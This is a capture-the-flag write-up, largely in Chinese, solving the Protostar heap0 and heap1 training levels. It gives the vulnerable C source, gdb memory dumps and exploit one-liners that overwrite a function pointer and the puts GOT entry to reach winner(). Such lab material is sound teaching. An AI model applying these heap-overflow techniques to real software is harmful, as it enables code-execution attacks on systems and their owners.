# Heap

## Protostar Heap0

### About

This level introduces heap overflows and how they can influence code flow.

This level is at /opt/protostar/bin/heap0

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);

  f->fp();
}
```

就像栈一样，堆内存是连续分配的。这意味着如果我们越过缓冲区写入数据，将覆盖另一个数据结构。定义了两个结构，其中`f->fp`是一个**函数指针**，指向`nowinner`函数，在程序的最下面进行了一次调用。有个`strcpy`函数将传入的字符串写入`d->name`中。

我们在函数返回前下个断点，查看一下`d`和`f`的地址。

```javascript
(gdb) b *0x08048500
Breakpoint 1 at 0x8048500: file heap0/heap0.c, line 40.

(gdb) r AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 AAAA
data is at 0x804a008, fp is at 0x804a050
level has not been passed

Breakpoint 1, 0x08048500 in main (argc=134513804, argv=0x2) at heap0/heap0.c:40
40    in heap0/heap0.c
```

可以看到`d`和`f`的地址属于堆，然后分别查看内容，**d的内容**就是我们传入的**AAAA**，**f**的内容是**nowinner函数的地址**。

```javascript
(gdb) info proc map
process 1605
cmdline = '/opt/protostar/bin/heap0'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap0'
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
     0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap0
     0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap0
     0x804a000  0x806b000    0x21000          0           [heap]
    0xb7e96000 0xb7e97000     0x1000          0

(gdb) x/30x 0x804a008
0x804a008:    0x41414141    0x00000000    0x00000000    0x00000000
0x804a018:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a028:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a038:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a048:    0x00000000    0x00000011    0x08048478    0x00000000
0x804a058:    0x00000000    0x00020fa9    0x00000000    0x00000000
0x804a068:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a078:    0x00000000    0x00000000

(gdb) x/10x 0x804a050
0x804a050:    0x08048478    0x00000000    0x00000000    0x00020fa9
0x804a060:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a070:    0x00000000    0x00000000

(gdb) disass nowinner
Dump of assembler code for function nowinner:
0x08048478 <nowinner+0>:    push   ebp
0x08048479 <nowinner+1>:    mov    ebp,esp
0x0804847b <nowinner+3>:    sub    esp,0x18
0x0804847e <nowinner+6>:    mov    DWORD PTR [esp],0x80485dd
0x08048485 <nowinner+13>:    call   0x8048398 <puts@plt>
0x0804848a <nowinner+18>:    leave
0x0804848b <nowinner+19>:    ret
End of assembler dump.

(gdb) p 0x804a050 - 0x804a008
$1 = 72
```

二者地址**相差72个字节**，所以我们通过填充72个字符，后面跟上**winner\(\)的地址**（通过`objdump -t heap0` 查看），就可以将`f->fp`改成指向winner函数，然后进行调用。

```text
user@protostar:/opt/protostar/bin$ ./heap0 $(python -c "print('A'*72 + '\x64\x84\x04\x08')")
data is at 0x804a008, fp is at 0x804a050
level passed
```

## Protostar heap1

### About

This level takes a look at code flow hijacking in data overwrite cases.

This level is at /opt/protostar/bin/heap

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

在此程序中，我们看到已分配了两个`Internet`结构。每个结构都包含一个单独分配的`name`指针。

```javascript
(gdb) r AAAA 0000
Starting program: /opt/protostar/bin/heap1 AAAA 0000

Breakpoint 1, main (argc=3, argv=0xbffff814) at heap1/heap1.c:34
34	heap1/heap1.c: No such file or directory.
	in heap1/heap1.c
// 查看堆地址，得到 0x804a000
(gdb) info proc map
process 1617
cmdline = '/opt/protostar/bin/heap1'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap1'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap1
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap1
	 0x804a000  0x806b000    0x21000          0           [heap]
	0xb7e96000 0xb7e97000     0x1000          0
// 查看一下堆中的内容
(gdb) x/64wx  0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x30303030	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
```

结构体internet中有一个**指向char类型的指针** `name`，在程序的最后进行了两次strcpy操作，可以实现溢出。如果我们将`i2->name` **的地址**进行覆盖，通过第二个strcpy能够做到任意位置写入数据。

我们可以看到第二个`strcpy`函数的后面调用了`puts`函数（源文件是用的`printf`，这里编译器给优化成了`puts`），我们可以**将GOT表进行覆盖**。

```javascript
0x08048547 <main+142>:	mov    eax,DWORD PTR [esp+0x18]
0x0804854b <main+146>:	mov    eax,DWORD PTR [eax+0x4]
0x0804854e <main+149>:	mov    DWORD PTR [esp+0x4],edx
0x08048552 <main+153>:	mov    DWORD PTR [esp],eax
0x08048555 <main+156>:	call   0x804838c <strcpy@plt>
0x0804855a <main+161>:	mov    DWORD PTR [esp],0x804864b
0x08048561 <main+168>:	call   0x80483cc <puts@plt>
0x08048566 <main+173>:	leave
---Type <return> to continue, or q <return> to quit---
0x08048567 <main+174>:	ret
End of assembler dump.
// 可以看到，调用puts时进行了一次跳转，目的地址是0x8049774，这个地址的内容是下一条指令的地址
// 这里涉及到了动态链接，暂时先不介绍了，但是我们知道如果将地址是0x8049774的内容改成winner函数的地址
// 就可以调用winner了
(gdb) disass 0x80483cc
Dump of assembler code for function puts@plt:
0x080483cc <puts@plt+0>:	jmp    DWORD PTR ds:0x8049774
0x080483d2 <puts@plt+6>:	push   0x30
0x080483d7 <puts@plt+11>:	jmp    0x804835c
End of assembler dump.

(gdb) x 0x8049774
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483d2

(gdb) p winner
$1 = {void (void)} 0x8048494 <winner>
```

### exp

```shell
user@protostar:/opt/protostar/bin$ ./heap1 `echo -e "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"` `echo -e "\x94\x84\x04\x08"`
and we have a winner @ 1596724910
```

